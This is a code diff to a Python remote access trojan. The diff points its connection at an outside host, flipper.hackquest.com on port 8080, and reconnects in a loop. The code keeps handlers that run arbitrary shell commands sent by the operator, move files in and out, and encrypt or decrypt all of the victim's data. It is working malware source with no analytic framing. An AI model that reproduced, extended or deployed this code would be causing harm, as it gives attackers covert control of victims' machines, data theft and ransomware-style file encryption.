@@ -118,7 +118,8 @@ try:
 	from Crypto import Random
 	from RAW import *
 except ImportError as e:
-	pip = lambda : os.system('pip install' + str(e)[15:])
+	#pip = lambda : os.system('pip install' + str(e)[15:])
+	pip =  lambda : pip.main(['install', str(e)[15:]])
 	pip()
 
 
@@ -149,7 +150,7 @@ class RAT(RAW):
 
 	# start the service
 	def start(cls):
-		while True:			
+		while True:
 			try:
 				cls.init()
 				cls.connect(cls._loop, cls._port)
@@ -175,16 +176,17 @@ class RAT(RAW):
 
 	# initializer
 	def init(cls):
-		# set new socket 
+		# set new socket
 		cls._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		# set loopback address
 		#cls._loop = "127.0.0.1" #socket.gethostbyname("localhost")
 		# domain.ddns.chickenkiller.com
 		# flipper.hackquest.com
 		#cls._loop = 'flipper.hackquest.com'
-		cls._loop = '127.0.0.1'
+		cls._loop = socket.gethostbyname('flipper.hackquest.com')
 		# set new port
-		cls._port = 4434
+		#cls._port = 4434
+		cls._port = 8080
 		cls._info = cls.build_info()
 
 
@@ -229,18 +231,12 @@ class RAT(RAW):
 			sys.exit(0)
 		# check for change directory
 		elif(data.startswith('cd ')):
-			try:	
+			try:
 				os.chdir(data[3:])
 				std = ""
 			except OSError as e:
-				# No such directory
-				if(e[0] is 2):
-					std = str(e)
-					pass
-				# Other errors
-				else:
-					std = str(e)
-					pass
+				std = cls.os_handler(e)
+				pass
 		# check for download
 		elif(data.startswith('download ')):
 			std = cls.upload(data[9:])
@@ -253,21 +249,28 @@ class RAT(RAW):
 		# encrypt all data
 		elif(data.startswith('encrypt_all')):
 			std = cls._raw.handler(data, "ea")
-		# encrypt data 
+		# encrypt data
 		elif(data.startswith('encrypt ')):
 			std = cls._raw.handler(data[8:], "e")
 		# decrypt all data
 		elif(data.startswith('decrypt_all')):
 			std = cls._raw.handler(data, "da")
-		# decrypt data 
+		# decrypt data
 		elif(data.startswith('decrypt ')):
 			std = cls._raw.handler(data[8:], "d")
-		# bind a shell subprocess  
+		# bind a shell subprocess
 		else:
 			proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 			std = proc.stdout.read() + proc.stderr.read()
 		return std
 
+	def os_handler(cls, err):
+		# No such directory
+		if(err[0] is 2):
+			return str(err)
+		# Other errors
+		else:
+			return str(err)
 
 	# socket error handler
 	def socket_handler(cls, error_type):
@@ -280,22 +283,22 @@ class RAT(RAW):
 		if(error_type[0] is 57):
 			cls.stop()
 			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str(error_type[1]))
-			time.sleep(cls.LONG_INTERVAL)		
+			time.sleep(cls.LONG_INTERVAL)
 		# Bad file descriptor
 		elif(error_type[0] is 9):
 			cls.stop()
 			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str(error_type[1]))
-			time.sleep(cls.LONG_INTERVAL)	
+			time.sleep(cls.LONG_INTERVAL)
 		# Broken Pipe
 		elif(error_type[0] is 32):
 			cls.stop()
 			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str(error_type[1]))
-			time.sleep(cls.LONG_INTERVAL)	
+			time.sleep(cls.LONG_INTERVAL)
 		else:
 			cls.stop()
 			print "CODE: {}\nMSG: {}".format(str(error_type[0]), str(error_type[1]))
 			time.sleep(cls.LONG_INTERVAL)
-	
+
 
 	# stop socket connection
 	def stop(cls):
@@ -348,9 +351,9 @@ class RAT(RAW):
 		return "\n"+str(os.uname())+"\n"
 
 
-	
 
-	
+
+
 def main():
 	rat = RAT()
 
